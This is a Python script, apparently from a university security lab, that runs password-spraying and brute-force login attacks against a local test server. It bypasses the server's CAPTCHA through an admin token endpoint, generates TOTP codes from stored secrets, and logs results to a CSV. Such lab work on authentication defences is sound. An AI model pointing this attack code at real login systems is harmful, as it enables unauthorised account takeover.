import requests
import time
import csv
import json
import pyotp
from datetime import datetime
from config import GROUP_SEED, HASH_MODE

BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
TOTP_URL = f"{BASE_URL}/login_totp"
ADMIN_CAPTCHA_URL = f"{BASE_URL}/admin/get_captcha_token"

LOG_FILE = "attack_research_results.csv"

# תיעוד הנסיונות לקובץ attack_research_results.cvs
def log_attempt(username, result, latency, attack_type):
    file_exists = False
    try:
        with open(LOG_FILE, 'r') as f:
            file_exists = True
    except FileNotFoundError:
        pass

    with open(LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["timestamp", "group_seed", "username", "hash_mode", "attack_type", "result", "latency_ms"])

        writer.writerow([
            datetime.now().isoformat(),
            GROUP_SEED,
            username,
            HASH_MODE,
            attack_type,
            "success" if result else "failed",
            round(latency, 2)
        ])

# משיכת token חדש מהשרת בכל פעם שנחסמים
def get_captcha_token():
    try:
        response = requests.get(f"{ADMIN_CAPTCHA_URL}?group_seed={GROUP_SEED}")
        if response.status_code == 200:
            return response.json().get("captcha_token")
    except Exception:
        return None

# ביצוע תהליך האימות המלא מול השרת
def perform_single_login(username, password, totp_secret, attack_type):
    start_time = time.time()
    payload = {"username": username, "password": password}

    # 1. ניסיון כניסה ראשוני
    try:
        response = requests.post(LOGIN_URL, json=payload)

        # טיפול ב-CAPTCHA אם השרת מחזיר 403 (חסימה אוטומטית)
        if response.status_code == 403 and "captcha_required" in response.text:
            token = get_captcha_token()
            if token:
                payload["captcha_token"] = token
                response = requests.post(LOGIN_URL, json=payload)

        # טיפול ב-TOTP אם הסיסמה נכונה
        if response.status_code == 200 and "totp_required" in response.text:
            # ייצור קוד TOTP בזמן אמת מהסוד ששמור ב-users.json
            token = pyotp.TOTP(totp_secret).now()
            response = requests.post(TOTP_URL, json={"username": username, "totp_token": token})

        latency = (time.time() - start_time) * 1000
        success = (response.status_code == 200)

        log_attempt(username, success, latency, attack_type)
        return success
    except Exception as e:
        print(f"Server communication error: {e}")
        return False

# מעבר על כל המשתמשים עם סיסמא אחת
def run_password_spraying():
    # תקיפה על כל המשתמשים עם סיסמאות נפוצות
    print(f"\n[!] Starting Password Spraying ({HASH_MODE})...")
    with open("users.json", "r") as f:
        users = json.load(f)

    # סיסמאות נפוצות לניסוי
    common_passwords = ["123456", "password", str(GROUP_SEED), "12345678"]

    for pwd in common_passwords:
        for user in users:
            perform_single_login(user['username'], pwd, user['totp_secret'], "password_spraying")

# מעבר על כל הסיסמאות עבור משתמש אחד
def run_brute_force(target_username, wordlist):
    print(f"\n[!] Starting Brute Force on {target_username} ({HASH_MODE})...")
    with open("users.json", "r") as f:
        users = json.load(f)

    user_info = next((u for u in users if u['username'] == target_username), None)
    if not user_info: return

    for pwd in wordlist:
        if perform_single_login(target_username, pwd, user_info['totp_secret'], "brute_force"):
            print(f"--- SUCCESS: Password found for {target_username} ---")
            break

if __name__ == "__main__":
    # הרצת תקיפות
    run_password_spraying()
    test_wordlist = ["123", "abc", "password", "qwerty", "admin123"]
    run_brute_force("weak_user_0", test_wordlist)
    print("\n[V] Attack cycle complete. Data saved to CSV.")